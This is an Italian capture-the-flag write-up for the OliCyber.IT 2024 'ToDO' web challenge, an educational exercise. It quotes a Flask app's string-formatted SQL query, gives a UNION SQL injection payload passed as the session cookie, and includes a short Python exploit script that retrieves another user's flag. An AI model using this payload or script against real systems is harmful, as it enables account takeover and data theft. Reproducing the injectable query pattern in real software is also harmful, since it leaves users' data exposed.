# OliCyber.IT 2024 - Selezione territoriale

## [web] ToDO (34 risoluzioni)

Volevo imparare Python e Flask, niente di meglio di una todo app, a quanto dice Reddit!

Sito: [http://todo.challs.territoriale.olicyber.it](http://todo.challs.territoriale.olicyber.it)

Autore: Aleandro Prudenzano <@drw0if>

## Soluzione

L'applicazione è composta da un web server, implementato con Flask in `app.py`, e un insieme di funzioni utili per interagire con il database sqlite, `db.py`. Analizzando il codice sorgente possiamo velocemente notare che tutte le query non sono eseguite utilizzando prepared statements, ma i parametri variabili sono formattati direttamente dentro le stringhe. Questo può portare a SQLinjection nel caso in cui i parametri di input non sono gestiti correttamente.

Questo accade infatti nella funzione `get_user_from_session`:

```python
    def get_user_from_session(self, session_id):
        cursor = self.get_cursor()

        cursor.execute(
            """SELECT users.id, users.username
            FROM users
            JOIN sessions ON users.id = sessions.user_id
            WHERE sessions.id = '%s';""" % (session_id,))

        users = cursor.fetchall()
        cursor.close()

        if len(users) == 1:
            return users[0]

        return None
```

Possiamo quindi effettuare una SQLinjection per alterare la query e farle ritornare i task appartenenti ad un altro utente, semplicemente usando il giusto payload, passato come cookie di sessione.

Un payload possibile è `' UNION SELECT id, username FROM users WHERE username='antonio' --`; con questo, la query ci ritornerà tutti i dati relativi all'utente `antonio`, che sappiamo essere quello contenente la flag fra le sue note.

## Exploit

```python
#!/usr/bin/env python3

import logging
import os
import requests
import re

# For HTTP connection
URL = os.environ.get("URL", "http://todo.challs.territoriale.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]


cookies = {
    "session": "' UNION SELECT id, username FROM users WHERE username='antonio' -- ",
}

r = requests.get(f"{URL}/todo", cookies=cookies)
flag = re.compile(r"flag\{.*\}").search(r.text)

if flag:
    print(flag.group())
else:
    print("Flag not found")
```
